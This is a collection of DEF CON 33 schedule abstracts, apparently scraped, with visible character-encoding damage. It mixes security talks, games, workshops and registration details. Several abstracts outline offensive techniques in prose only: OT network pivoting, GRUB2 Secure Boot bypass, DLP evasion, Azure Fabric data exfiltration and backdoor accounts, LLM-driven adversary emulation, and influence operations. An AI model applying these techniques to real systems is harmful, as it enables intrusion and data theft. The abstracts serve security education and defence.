<p>This approach involves a considerable amount of reverse-engineering of userspace binaries and libraries, alongside poring over whatever GPL code we can find, in order to write kernel patches, dummy drivers and make QEMU changes âreactivelyâ. Our goal is to end up with a rehosting environment which, from the perspective of userspace, looks almost exactly like the real system.</p>

Iâll demonstrate how simple, legitimate system behaviors can be passively weaponized to gather intelligence, fingerprint users, and pivot across services. All without ever escalating privileges or exploiting a single bug.

<p>Culture isnât just found in galleries or libraries - it lives in code, on screens, and sometimes, in the viruses that once infected our machines. Building a Malware Museum tells the story behind creating the worldâs first online Malware Museum and its evolution into the Museum of Malware Art in Helsinki.</p>

<p>Only we can save the culture of our time. And our culture is digital. Preserving digital culture is hard: Software rots. Hardware vanishes. File formats die. And some digital artifacts - like computer viruses - were never meant to survive.</p>

<p>Mikko Hypponen has been archiving malware since 1991, originally for research - but today, this collection also holds cultural value. These digital fossils now offer a glimpse into a forgotten world of underground creativity, early hacking culture, and unintended digital aesthetics. Thanks to modern emulation techniques, itâs now possible to safely relive how those early viruses looked, sounded, and behaved.</p>

<p>In November 2024, Mikko opened the world's first Museum of Malware Art, in Helsinki. This art museum features modern art commissioned from artists around the world, all inspired by malware or cyber attacks. </p>

<p>This is a journey through preservation, nostalgia, and the art of archiving what was never meant to last. Because even malware is part of our history.</p>

<p>As industrial environments become increasingly interconnected, the OT DMZ stands as a critical yet vulnerable boundary between enterprise IT networks and operational technology. In this talk, we expose the offensive strategies adversaries use to penetrate the OT DMZ and pivot into sensitive control system networks. Drawing from real-world red team operations and threat intelligence, weâll explore how misconfigured remote access solutions, poorly segmented architectures, and legacy services create exploitable pathways into industrial environments.
Attendees will gain insight into tradecraft used to move from enterprise footholds into OT networks, including techniques for identifying and abusing jump hosts, proxy services, Citrix gateways, and RDP relays. Weâll demonstrate practical TTPs for lateral movement, credential access, and evasion within the DMZ layerâhighlighting how assumptions about segmentation often fall short in practice. Finally, weâll discuss defensive takeaways to help asset owners detect and mitigate these threats before they escalate.
This presentation is aimed at offensive security professionals, defenders, and industrial security leaders seeking to understand how the OT perimeter is being targetedâand how to better protect it.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>As part of their training and certifications, most professional mariners memorize the ânautical rules of the roadâ. The International Regulations for Preventing Collisions at Sea (COLREGs), form the foundation of maritime safety by establishing predictable behaviors and shared responsibilities between vessels. This a system with built-in protection and fall-back plans, tried and tested over a long history. But for hackers or cyber defendersâwho might not know starboard from Starbucksâ understanding these norms may mean the difference between big effect or no effect. Our talk focuses on one memorable guideline that ship drivers often fall back on: Donât Turn To Port (unless youâre absolutely sure itâs safe). There is plenty of good research out there about how cyber-physical systems such as rudder angle controllers can be manipulated on manned and unmanned systems. There is good writing on the threats unique to maritime choke points. But agnostic to the location, why would cyber manipulation of a rudder to induce a port turn be worse than a starboard one? Our talk will touch briefly on how the rules influence legal liability for collisions at sea, and conclude with encouragement for people to learn the rules of the road and further their own journey in understanding the maritime profession.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The OWASP Amass Project has long been a staple in the open-source reconnaissance ecosystem, enabling security researchers, red teamers, and defenders to map attack surfaces through passive and active discovery techniques. Traditionally, tools like Amass have relied on DNS, certificate transparency logs, web scraping, and other data sources to infer the digital footprint of an organization. However, this approach often begins with known domains and struggles to comprehensively uncover the broader infrastructureâespecially when initial input is minimal or obfuscated.<em>x000D</em>
<em>x000D</em>
This talk introduces a major advancement in the Amass discovery model: leveraging legal entity information as a pivot point for infrastructure enumeration. By incorporating corporate legal names, the project now enables users to query the Registration Data Access Protocol (RDAP) for associated IP address ranges directly linked to specific organizations. This evolution allows for a powerful âoutside-in"" discovery strategyâone that begins with an organizationâs registered presence in global ICANN records and regional internet registries (RIRs).<em>x000D</em>
<em>x000D</em>
We will walk through how this process functions end-to-end within Amass, including:<em>x000D</em>
<em>x000D</em>
How legal entity names are normalized, enriched, and used to perform RDAP queries across multiple registries.<em>x000D</em>
<em>x000D</em>
How this approach facilitates infrastructure discovery even when no initial domain names or IPs are known.<em>x000D</em>
<em>x000D</em>
Ways in which the newly discovered CIDRs and netblocks are fed into the broader Amass enumeration engine for DNS sweeps, and passive data correlation.<em>x000D</em>
<em>x000D</em>
Importantly, this capability allows researchers to identify internet-connected assets that might otherwise be missed through traditional meansâespecially helpful for uncovering legacy infrastructure, misconfigured services, and shadow IT. It also helps bypass the inefficiency of wide-scale internet scanning by using authoritative registry data as a precise targeting mechanism.<em>x000D</em>
<em>x000D</em>
This talk will include practical demonstrations of the feature in action, guidance on using it effectively in both red and blue team workflows, and a look at where the project is heading nextâincluding potential integrations with open corporate registries, LEI databases, and expanded RDAP coverage.<em>x000D</em>
<em>x000D</em>
Takeaways for Recon Village Attendees:<em>x000D</em>
<em>x000D</em>
Learn how legal entity metadata can be leveraged to scale reconnaissance beyond domains and WHOIS lookups.<em>x000D</em>
<em>x000D</em>
Gain an understanding of how RDAP reveals registered network ownership and how Amass now uses this for bottom-up discovery.<em>x000D</em>
<em>x000D</em>
See live examples of uncovering unknown IP ranges and infrastructure linked to an organizationâwithout scanning the full IPv4 space.<em>x000D</em>
<em>x000D</em>
Understand the implications of this technique for external asset management, third-party risk analysis, and adversarial recon.<em>x000D</em>
<em>x000D</em>
By advancing outside-in discovery with deeper legal and registration context, Amass continues to push the boundaries of OSINT toolingâbridging the gap between traditional internet reconnaissance and more strategic, organizationally-aware approaches to mapping the modern attack surface.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<p>Chakras are the energy centers in your body where energy flows. These energy centers are directly linked to mental, physical, emotional and spiritual attributes and well-being. Chakras are constantly in flux and can be imbalanced by becoming underactive or overactive and our being as a whole becomes imbalanced often leading to dis-ease and/or emotional blocks that disrupt our internal environment and harmony. </p>

<p>During this workshop, we will explore each chakra from the root up to the crown through their attributes, color, element, mantra, affirmation, crystals
and essential oils. </p>

<p>Then, we will drop into our physical and energetic bodies in a Reiki infused guided, grounding and clearing chakra meditation for a journey of deep
relaxation, Earth connection and energy restoration.</p>

<p>This workshop is inclusive of all bodies. EveryBODY is Welcome here.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Megan Allen<br>
<p>Hi, Iâm Megan Allen.</p>

<p>My work focuses on a holistic approach to health; moving the bodyâs natural energy into alignment with Earth and the seven chakras. I practice integrative wellness - honoring a person's emotional, mental, physical and spiritual well-being. I provide intuitive healing sessions and work with clients to relax the mind, increase body awareness and balance energy flow.</p>

<p>I also facilitate community wellness workshops, ceremonies and transformational group programs inviting participants to disconnect from their busy lives, turn inward and tap into the present to restore and maintain the bodyâs energetic balance and cultivate self-love, empowerment and sovereignty.</p>

<p>I inspire people to activate their highest potential in alignment with their wise hearts and to promote healing from within. I tailor my sessions to reflect this; using techniques from my healing disciplines as well as my love for Traditional Chinese Medicine, holistic aromatherapy, crystals and essential oils, tarot, animal medicine cards and a deep reverence for nature.</p>

<p>Nature is one of my greatest teachers. It constantly teaches me about grounding, stability, resilience, boundaries, growth, and stillness.</p>

<p>Welcome to the ""AI Art Battle"" Generative AI Art Contest!</p>

<p>This unique competition invites creative minds to dive into the world of artificial intelligence and art. The challenge is to craft the most imaginative prompts that will be used by generative AI models to create artwork.</p>

<p>Contestants will not be creating the art themselves; instead, they will focus on designing prompts for well-known topics that push the boundaries of creativity and innovation.</p>

<p>How It Works:</p>

<p>Select a Topic:</p>

<p>Contestants will choose from a list of random topics.</p>

<p>These could range from historical events, famous literary works, mythical creatures, futuristic landscapes, to iconic pop culture references.</p>

<p>Craft a Prompt:</p>

<p>Using their creativity, contestants will write a detailed prompt designed to guide AI models in generating original artwork. The prompts should be clear, imaginative, and offer enough detail to spark the AI's artistic capabilities.</p>

<p>Submission:</p>

<p>Each contestant will submit their prompt and the intended outcome.</p>

<p>AI Generation:</p>

<p>The submitted prompts will be fed into a generative AI art model, which will create corresponding artworks based on the prompts.</p>

<p>A random panel will determine who the winners are.</p>

Well wonder no more! Back to start its 31st year at Defcon, Hacker Jeopardy will have you laughing, groaning and wondering where all the brain cells have gone.

<p><strong>Please note: This two-day training will be offered on Saturday and Sunday (August 9-10). Participants will receive a DEF CON Human Badge with their registration</strong></p>

<p>It is indeed all about the information. Information is powerâand those who control it hold the reins. This course dives deep into the topic of Influence Operations (IO), teaching you how adversaries manipulate, deceive, and control the flow of information to achieve their objectives. From destabilizing governments to swaying elections and ruining careers, IO is a tool used by state and non-state actors alike. The question is, how do you defend against it?</p>

<p>In this fast-paced, hands-on course, weâll break down how IO is planned, executed, and defended against. Youâll gain the skills and knowledge to not only recognize and counteract these operations but to protect yourself, your organization, and even your country from their impact.</p>

<p>What You'll Learn:</p>

<ul>
<li>IO Strategies &amp; Tactics: From the basics to advanced techniques, understand how influence operations shape public opinion, corporate behavior, and political landscapes.</li>
<li>Psychological Operations (PSYOP): Explore the manipulation of biases, emotions, perceptions, and actions to control outcomes.</li>
<li>Deception and Counterdeception: Learn how deception campaigns are crafted, and how to spot and disrupt them.</li>
<li>Military Doctrine &amp; TTPs: Understand military frameworks for IO and adapt them for defending against threats.</li>
<li>Incident Response &amp; Defensive Tactics: Equip yourself with practical strategies for detecting and defending against IO campaigns targeting individuals and organizations.</li>
<li>Crafting Messages &amp; Understanding Propagation: Learn the art of creating and spreading messages to achieve specific goalsâwhile also learning how to counter malicious ones.</li>
<li>Real-World Case Studies: From deceptive news to social media manipulation, analyze recent IO campaigns to understand their impact and develop defensive strategies.</li>
<li>Live IO Campaign Contest: Compete in a live âbest IO campaignâ contest, applying the techniques youâve learned during the course to test your strategies. </li>
</ul>

<p>By the end of the course, youâll not only have a deep understanding of how IO is executed, but you'll also walk away with practical tools to defend against these attacks. Youâll learn how to recognize the signs of manipulation, understand the motivations behind IO, and develop countermeasures to protect against them.</p>

<p>In a world where information is weaponized, knowing how to protect yourself is no longer optional. Whether youâre securing yourself, an organization, protecting a political campaign, or defending a nation, this course is your toolkit for navigating the complex and increasingly dangerous world of influence operations.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Open-source security is facing an existential crisis. From the xz backdoor to Log4Shell and even vulnerabilities in ncurses, we are witnessing a recurring pattern: widely used but poorly scrutinized components becoming critical attack vectors. GRUB2 is no exception.</p>

<p>In this talk, I will present a deep dive into several vulnerabilities I discovered in GRUB2's major filesystem driversâexploitable flaws in one of the most privileged and security-critical pieces of software in the modern boot chain. Despite its role in Secure Boot, GRUB2 lacks fundamental OS security mechanisms (no ASLR, no modern exploit mitigations) and processes a large volume of untrusted inputâviolating Google's """"Rule of 2"""" security principle.</p>

<p>We'll begin with an overview of UEFI and Secure Boot, demonstrating how GRUB2 fits into the ecosystem and why it remains an attractive target for attackers. I will then detail my findings, showcasing how an attacker can exploit these flaws to subvert Secure Boot entirely. Through a practical demonstration, we will explore the implications of these vulnerabilitiesâturning a standard bootloader attack into a full-blown compromise of system integrity.</p>

<p>Additionally, I will be describing my journey into discovering similar vulnerabilities other bootloaders such as U-boot and Barebox.</p>

<p>Finally, we will discuss the broader security implications, including the urgent need for stronger security practices in open-source bootloaders and what steps can be taken to prevent the next major supply chain disaster.</p>

<p>This talk will be essential for security researchers, enterprise defenders, and anyone relying on Secure Boot for protection. If you thought your bootloader was secureâthink again.</p>

<p>Note: DCGVR Talks are scheduled 1 hour slots, but the actual presentations can be as short as 30 minutes. Please arrive at the start of the hour.</p>

<p>Angry Magpie is an open-source toolkit that demonstrates critical bypasses in enterprise Data Loss Prevention (DLP) systems through browser-based techniques. Our research identifies a class of attacks âÃÃ® Data Splicing âÃÃ® that enable exfiltration of sensitive data by transforming it to evade detection patterns used by both proxy and endpoint DLP solutions. The toolkit showcases four primary techniques: data sharding, ciphering, transcoding, and channel smuggling, each demonstrating specific architectural limitations in current DLP implementations. Security teams can use Angry Magpie to test their defense mechanisms against these practical attacks, providing valuable insights for enhancing data protection strategies. With browsers now serving as the primary access point for enterprise data, understanding and addressing these vulnerabilities has become essential for maintaining effective data security posture.

<p>Our human registration process this year will be very similar to previous years. Please be patient. All of the times listed here are <strong>approximate</strong>. </p>

<h1 id=""basics"">Basics</h1>

<h3 id=""whoneedsabadge"">Who needs a badge?</h3>

<p>A badge is required for each human age 8 and older.</p>

<h3 id=""human"">Human?</h3>

<p>You are a human if you do not know otherwise. People that are not humans include goons, official speaker, village/community/contest/creator staff, press, black badge holders, or similar. If you are not a human, you need to register separately. If you don't know how, see an NFO goon (NFO Node, formerly known as an infobooth, is where you can get help). The remainder of this message applies only to humans.</p>

<h3 id=""lineslinecon"">Lines? Linecon?</h3>

<p>Linecon is your optional opportunity to stand (or sit) in line for human registration to open. Doors will open for linecon on Wednesday at approximately 17:00. When human registration opens on Thursday at approximately 08:00, they start working the linecon queue, and the line will start moving quickly. (Please understand that we will begin processing the line on Thursday morning as soon as the cashiers and materials are in place; we will strive for Thursday 08:00, but actual start may be slightly earlier or later.)</p>

<p>Online badge purchase (aka pre-registration) has no impact on linecon. You can join the line on Wednesday (if you wish) regardless of whether you purchased a badge online or intend to pay with cash. There is only one linecon for both types of badge sales. </p>

<p>Please help us make this a great experience for everyone by <strong>following directions given by goons</strong>. After human registration opens, there may be one line for all of registration, or there may be two lines (one for online sales (pre-registration) and one for cash sales). This may also change over time, based on available staffing and necessary crowd control. We will strive to make it easily understandable in-person as to which line you should join. </p>

<h1 id=""waystobuyabadge"">Ways to buy a badge</h1>

<ul>
<li>$560 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until July 18, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$580 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until August 1, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$500 cash purchase on-site.</li>
<li>As part of a BlackHat registration.</li>
</ul>

<h3 id=""onlinepurchase"">Online Purchase</h3>

<p>You will be emailed a QR code to the email address provided when you bought your badge. Please guard that QR code as though it is cash -- it can only be redeemed once, and anyone can redeem it if they have it (including a photo of it). Badges are picked-up on-site -- they will not be mailed or shipped.</p>

<p>We can scan the QR code either from your phone's display or from a printed copy. You <strong>must</strong> have the QR code with you in order to obtain your badge. As you approach the front of the line, if you are going to show your QR code on an electronic device, please ensure that your display is set to maximum brightness. </p>

<p>If you pre-registered, but ultimately are unable to attend DEF CON and want to cancel your purchase, the <strong>only</strong> way to get a refund is from the original online source. We are unable to provide any refunds on-site at DEF CON. There is a fee to have your badge canceled: $34 before July 18, and $84 on and after July 18.</p>

<p>Online purchases are provided a receipt via email when the purchase is made.</p>

<p>Online purchase -- often referred to as pre-registration -- does not allow you to skip any line/queue to pick up your badge. Once you arrive on-site, you will need to join the existing line for human registration. There may or may not be a dedicated line for pre-registration badge pickup, depending on when you arrive, how long the line is, available staff, etc.</p>

<h3 id=""cashpurchase"">Cash Purchase</h3>

<p>Badges will be available for purchase on-site at DEF CON. All badge sales are <strong>cash only</strong>. No checks, money orders, credit cards, etc., will be accepted. In order to keep the registration line moving as quickly as possible, please have <strong>exact change</strong> ready as you near the front of the line.</p>

<p>There are no refunds given for cash sales. If you have any doubt about your desire to buy a badge, please refrain from doing so.</p>

<p>We are unable to provide printed receipts at the time of the sale. A generic receipt for the cash sale of a badge will be made available on media.defcon.org after the conference. You are welcome to print your own copy of the receipt on plain paper.</p>

<h3 id=""viablackhat"">Via BlackHat</h3>

<p>If you've purchased a DEF CON badge as part of your Black Hat registration, you're in luck - you will be able to pick up your DEF CON badge at Black Hat on Thursday.  Please bring your Black Hat badge and watch for emails from Black Hat about where exactly the badge pickup will be.  There will be DEF CON goons at Mandalay at the pickup desk to help out and answer questions.</p>

<p>Please note that DEF CON is not able to access or verify Black Hat registration or attendee info.  DEF CON's preregistration list is not the same as Black Hat's.  For help, ask at Black Hat registration or the concierge area. </p>

<h1 id=""misc"">Misc</h1>

<p>Want to buy multiple badges? No problem! We're happy to sell you however many badges you want to pay for.</p>

<p>If you lose your badge, there is unfortunately no way for us to replace it. You'll have to buy a replacement at full price. Please don't lose your badge. :( </p>

<p>If you are being accompanied by a full-time caretaker (such as someone who will push your wheelchair, and will accompany you at all times), please ask to speak to a Registration Goon. Your caretaker will receive a paper badge that will permit them to accompany you everywhere you go.</p>

<h1 id=""stillneedhelp"">Still need help?</h1>

<p>If you have questions about anything regarding human registration that are not addressed here, please ask to speak to a Registration Goon.</p>

<p>The rapid advancement of large language models (LLMs) is reshaping the landscape of cybersecurity. These models are not only achieving higher benchmarks in math, coding, and cybersecurity tasks but are also being leveraged by threat actors to enhance resource development and social engineering capabilities. As LLMs continue to evolve, what could autonomous cyber capabilities powered by these models look like? How can we responsibly harness their potential for adversary emulation and defense?
In this talk, we will explore the integration of LLMs into MITRE Caldera, a scalable automated adversary emulation platform, and investigate how these models can transform adversary emulation through three distinct paradigms: as planners, as factories for constructing custom cyber abilities, and as forward-deployed autonomous agents. Drawing on existing research, including papers on LLM-assisted malware development and benchmarks for offensive cyber operations, we will examine the capabilities of LLMs in generating plausible emulations of advanced persistent threats (APTs).</p>

<p>The session will feature live demonstrations showcasing how LLMs can replicate adversary profiles, construct new cyber abilities on the fly, and autonomously execute emulation tasks. Attendees will gain insights into the performance of these paradigms, their implications for purple teaming, and the challenges of maintaining realistic emulations.
Finally, we will look ahead to the future of adversary emulation, discussing how APTs might leverage autonomous or semi-autonomous LLM capabilities in practice and the role of increasingly powerful models in shaping the next generation of cybersecurity tools. Whether you're a defender, researcher, or technologist, this talk will provide a compelling glimpse into the possibilities and risks of LLM-enabled adversary emulation.</p>

<p>Blue Team
You are assigned to the Cybersecurity Team servicing four Regional Airports within the IG Labs Regional Airport System. The shift this evening started with routine checking status boards, reviewing threat alerts, and checking for any newly identified vulnerabilities that may have an impact on the system from both Information Technology (IT) and Operational Technology (OT) vectors.</p>

<p>Around midnight, chaos ensues! Runway lighting is turning off at your airport and others nearby, planes are circling waiting to land or diverting to other locations. You must regain access to your systems, find the problem, and restore operation to the Runway Lighting Control System quickly and ensure that the other regional airports your team is responsible for do not lose control of their systems and operations are able to continue without interruption.</p>

<p>Red Team(s)
Cybersecurity Teams are often heavily focused on securing Information Technology (IT) systems and devices but may not consider securing Operational Technology (OT) systems and devices. While OT systems and devices may be connected to IT systems, the type of data and protocols are different.</p>

<p>You start your day exploring OT system vulnerabilities and consider what chaos you could create. You see a report that the runway lighting system at one of the IG Labs Regional Airports has been compromised. You start researching to learn more about the attack and the IG Labs Regional Airport System. Satisfied that you have learned enough to add to the madness that has been created at La Valoria, you decide to launch an attack of your own.</p>

<p>Success will be determined by the ability to disrupt the control and operations of the Runway Lighting Systems for the IG Labs Regional Airports at the OT level. DoS and DDoS attacks are not permitted as the intent is to demonstrate an understanding of OT systems, their functionality, and protocols.</p>

<p>In March 2025, a critical supply chain attack struck the popular GitHub Action <code>tj-actions/changed-files</code>, used by more than 23,000 repositories. The attacker slipped in a malicious version that silently exfiltrated CI/CD secrets by printing them to workflow logsâeverything from Personal Access Tokens to private SSH keys was suddenly at risk. This incident (CVE-2025-30066) revealed just how easy it is for a trusted third-party action to turn into a threat vector, especially when security controls around CI/CD workflows are lacking.</p>

<p>We built Flowlyt as a static analysis and policy-as-code tool that scans GitHub Actions workflows for signs of malicious behavior, hardcoded secrets, and insecure patterns. With support for Open Policy Agent (OPA), it lets security teams define and enforce custom rules that align with their CI/CD security standards.</p>

<p>As we have seen with AIxCC, AI brings new tools to help with cybersecurity. But developing and operating AI/ML applications introduces new dimensions of risk due to their dynamic behavior, inherent complexity, and often opaque decision-making processes. The transition from Development and Operations (DevOps) to Development, Security, and Operations (DevSecOps) revealed the need for security practices integrated into the Software Development Life Cycle (SDLC) to address critical software security gaps. Machine Learning Operations (MLOps) will now need to go through the same transition into MLSecOps. MLSecOps places a strong emphasis on integrating security practices within the ML development life cycle. It establishes security as a shared responsibility among ML developers, security practitioners, and operations teams. Embracing this methodology enables early identification and mitigation of security risks, facilitating the development of secure and trustworthy ML models.</p>

All human beings have three lives: public, private, and secret.â<br />
â Gabriel GarcÃ­a MÃ¡rquez<br />

<p>This workshop will focus on our public and private lives, as well as things one might want to keep secret. If all of your data is public, then anyone can access everything everywhere. While access everywhere is the theme of DC 33, we will focus on shutting down access to your data. Being private can help set you free. We will go over both OSINT techniques to see what an individualâs footprint is and then also go over obfuscation techniques to lessen that footprint. Attendees of this workshop should bring their device and be ready to work on becoming more private.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Welcome to accessDenied, a high-stakes, hands-on tabletop experience where you're not just playing cardsâ¦ you're protecting critical infrastructure.  Imagine trying to secure your facilities, water, power, communication, while your so-called âalliesâ across the table spot every vulnerability you missed. And you? You're doing the same to them. In this game, you'll simulate cyber attacks, defend your systems, and learn how breaches ripple through networks, all through fast-paced, strategic play based on real-world incidents like the Maroochy Water hack and the Kyiv power grid attack.</p>

<p>ð Who Should Play?</p>

<ul>
<li>Newcomers curious about cybersecurity</li>
<li>Security pros who like strategy games</li>
<li>Engineers, students, and defenders looking to sharpen their threat modeling skills</li>
<li>DEF CON attendees who want a break from screens and a seat at the table</li>
</ul>

<p>ð¯ What Youâll Learn</p>

<ul>
<li>How attacks link to defenses</li>
<li>Why mitigation doesnât always come fast enough</li>
<li>How weak points in one system compromise others</li>
<li>What âlateral movementâ actually looks like
â
âð§  More Than a Game</li>
</ul>

<p>accessDenied isn't just for fun, itâs designed to educate non-cybersecurity players and create smarter conversations about digital threats to critical infrastructure. Whether you're a hacker, a healthcare nerd, or just want to try something new, this tabletop challenge belongs in your DEF CON lineup.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Jack Voltaic, RIT<br>
<p>United States military installations and their surrounding communities share an interest in the resiliency of cyber-critical infrastructure systems. In addition to civil-military interdependencies, a failure in one critical infrastructure sector can cause cascading effects across others. ACI launched the Jack Voltaic (JV) initiative to address gaps and build resilience. Beginning with the first exercise (JV 1.0) in 2016, these exercises addressed multi-sector cyber-critical infrastructure challenges.</p>

<p>Civil-military
Local, community level
Multi-sector
Unclassified</p>

<p>With JV 4.0, ACIâs critical infrastructure resilience program will mature and transition. Through partnerships with other academic and policy communities, ACI seeks to foster the growth of JV-inspired practices. Multiple initiatives through 2025 will build upon the momentum and lessons of JV 1.0 - 3.0.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Sector Down is a high-stakes, immersive multiplayer card game where critical infrastructure and cybersecurity collide. Designed for teams of 5, 10, 15, or 20 players, this simulation pits defenders and attackers against each other in a race against the inevitable: The Doom Clock.</p>

<p>ð¡ï¸Defend or Disrupt</p>

<p>Players are divided into two sides:
- Blue Team â Critical infrastructure defenders. Each Blue player manages a sector with three vital facilities: Physical, Network, and Financial. Their mission? Keep the systems alive and online while working together to run out the clock.
- Red Team â Offensive disruptors. Red players attempt to take down facilities using calculated cyberattacks and chaos tactics. Their goal: force sector collapses and trigger the Doom Clock.</p>

<p>â±ï¸ Time-Based Tactics</p>

<p>The game progresses in strategic phases where players draw cards, take action using worker tokens, and discard based on hand limits. Watch out for unpredictable âWhite Playsâârandom game events that add surprise twists every few rounds.</p>

<p>ð¥ The Doom Clock</p>

<p>When half of all sectors or any core sectors go down, the Doom Clock starts ticking. Teams must respond fast: Blue must recover systems before the countdown hits zero, or Red claims victory.</p>

<p>ð¤ Team Dynamics</p>

<ul>
<li>Worker Sharing: Blue teammates can lend each other resources in bonus phases.</li>
<li>Overtime Mechanics: When the pressureâs on, Blue players can double down on effortâwith the tradeoff of worker exhaustion in future turns.</li>
</ul>

<p>ð® Why You Should Play</p>

<ul>
<li>Dive into a realistic cybersecurity crisis.</li>
<li>Learn how interdependent systems behave under attack.</li>
<li>Collaborate and compete with hackers, healthcare defenders, and critical infrastructure enthusiasts.</li>
<li>Engage with a visually rich map interface and fast-paced card dynamics.</li>
</ul>

<p>Whether you're a strategist, a chaos agent, or just love competitive simulation, Sector Down challenges your mind and your teamwork. Can your team hold the line or will your sector go dark?â Come play during DEF CON 33.</p>

<p>After years of planning and development, the highly anticipated new version of rs0n's bug bounty hunting framework is ready to go!  Aptly named The Ars0n Framework v2, this tool is specifically designed to help eliminate the friction for aspiring bug bounty hunters.  This tool not only automates the most commonly used bug bounty hunting workflows but each section includes detailed lessons that help beginners understand the """"Why?"""" behind the methodology.   Finally (and perhaps most exciting of all), reports generated from the data collected provide the user with guidance at critical decision points based on rs0n's many years of bug bounty hunting experience. Simply put, this tool is designed to help beginners compete w/ the pros on Day 1, and the best part is it's absolutely FREE!</p>

<p>In this talk, rs0n will go into extensive detail about how the tool works, what changes were made from version 1, how to use (and troubleshoot) the framework, ways of engaging with the community, and much more!  The goal is to provide the audience with all the information they need to start using the tool today.

<p>Big data, big mess. Bigger and more data is in Fabric, the more messy it can be. Azure unified the data lake house, data warehouse and PowerBI services into a SaaS platform called Fabric. In this talk, we discuss the three areas in the tenant level settings to look after and not to open up Fabric to everything. Then we will discuss data exfiltration scenarios (like data pipeline or notebook etc), how is it possible to create backdoor account (i.e.: Activator).</p>

<p>Intro - 1min
Who am I and what is Fabric.</p>

<p>Tenant Level Settings to Review - 4mins
Selecting the top 3 tenant level areas (External Data Sharing, Admin API calls, Information Protection) to review why they can be dangerous.</p>

<p>Data Exfiltration via Data Pipeline, Notebook, Shortcut, SQL Endpoint, Mirrored Db - 12mins
Discussing the possibilities of how data pipeline can automatically copy data from our own tenant's source to a destination in a different tenant. SQL Endpoint is automatically created for reading purposes. Guest account in Entra ID can be added to the workspace as viewer and using SQL Server Management Studio (SSM) to open SQL analytics endpoint. Mirrored Database is automatically synchronize data between 2 database where the destination can be an external tenant. A notebook is all about executing code and handling existing data (handing out the data).
Demo video about a pipeline copy to another tenant storage account.</p>

<p>Backdoor via Activator (Notebook, Power Automate, Scheduled Spark Job) - 13mins
Discussing how the Activator can be used to create a backdoor user via executing python code via Notebook, Scheduled Spark Job or low-code Power Automate.
Demo video (8mins) demonstrating how a backdoor account is created by using Activator to run a Notebook which executes Azure Python SDK code.</p>

We retrofitted it into an IoT CTF based badge dispensing machine, bling and all. Find enough flags on our web hosted CTF platform, you get a 5N4CK3Y dispense code, punch it in, and a badge is vended to you! There are a variety of challenges to earn a badge as well others to continue working on the badge itself once obtained. These span from hardware hacking, reverse engineering, OSINT, network security, phreaking, wireless, and cryptography to name a few. There's a little bit of everything, so it's a perfect way to learn something at one of the many DEF CON villages and talking with people you meet, then attempt the CTF challenges to dispense a badge. Hardware hacking is our passion and we want people to learn on badges once they get them.</p>

<p>Rebooted this year, enjoy a traditional fox hunt tracking down the hidden transmitters.</p>

<p>Up for more of a challenge? Attempt to solve the hidden puzzle within the fox hunt to win the ultimate prize!</p>

<p>--</p>

<h1 id=""projectaccess:afoxhuntintheshadows"">PROJECT ACCESS: A Fox Hunt in the Shadows</h1>

<p>The last surviving fragments of Project ACCESS, a defunct open comms initiative, have resurfaced. The faceless OmniCorp thought they had erased it from the spectrum, but rogue operatives are pushing back. Disguised among the DEF CON crowd, Foxes are carrying the pieces needed to reboot the system.</p>

<p>Theyâre broadcasting open signals across the con space. Your job? Track them down, follow the trail, and recover the payloads. Some Foxes are stationary. Others are on the move. All of them have something you needâbut they wonât just hand it over. Youâll have to answer DEF CON trivia, solve puzzles, or earn their trust in creative ways.</p>

<p>This isnât a gear-only hunt. Whether youâre rocking SDRs, handheld radios, or just tuned into the right frequency, youâve got a shot. Itâs part signal chase, part real-world goose chase, and 100% hacker weirdness.</p>

<p>Expect:
- Live human Foxes broadcasting short-range signals
- Some Foxes roaming the con floor hunt them down, respectfully
- DEF CON history questions, crypto puzzles, and maybe a social engineering twist or two
- Physical items or clues exchanged when you succeed
- No encryption. No gatekeeping. Just old school radio and clever chaos.</p>

<p>Think you can track the signal, crack the code, and restore the last breath of open access?</p>

<p>Then grab your gear, tune in, and start hunting.</p>

<h4 id=""participantprerequisites"">Participant Prerequisites</h4>

<p>RF Fox Hunt(s): To participate in the RF fox hunt(s), you will need a radio or scanner that can receive signals in the 2m and/or 70cm Amateur Radio Bands (144.000 MHz - 148.000 MHz, 420.000 MHz - 450.000 MHz).</p>

<p>In this game capture the flag you will be presented with real configurations of real wireless and radio technologies to attack. Practice your skill and learn new ones from Radio Frequency IDentification (RFID) through Software Defined Radio (SDR) and up to Bluetooth and WiFi. There may even be Infrared, if you have the eye for it.</p>

<p>RF Hackers Sanctuary is once again holding the Radio Frequency Capture the Flag (RFCTF) at DEF CON 32. RFHS runs this game to teach security concepts and to give people a safe and legal way to practice attacks against new and old wireless technologies.</p>

<p>We cater to both those who are new to radio communications as well as to those who have been playing for a long time. We are looking for inexperienced players on up to the SIGINT secret squirrels to play our games. The RFCTF can be played with a little knowledge, a pen tester's determination, and $0 to $$$$$ worth of special equipment. Our virtual RFCTF can be played completely remotely without needing any specialized equipment at all, just using your web browser! The key is to read the clues, determine the goal of each challenge, and have fun learning.</p>

<p>This game doesn't let you sit still either, as there are numerous fox hunts, testing your skill in tracking various signals. If running around the conference looking for WiFi, Bluetooth, or even a Tire Pressure Monitoring System (TPMS) device sounds like fun, we are your source of a higher step count.</p>

<p>There will be clues everywhere, and we will provide periodic updates via discord and twitter. Make sure you pay attention to what's happening at the RFCTF desk, #rfctf on our discord, on Twitter @rf_ctf, @rfhackers, and the interwebz, etc. If you have a question - ASK! We may or may not answer, at our discretion.</p>

<p>This year, for the first time ever, Bug Bounty Village is bringing you a Capture the Flag with a twist. This CTF is designed to feel just like a real bug bounty hunt.</p>

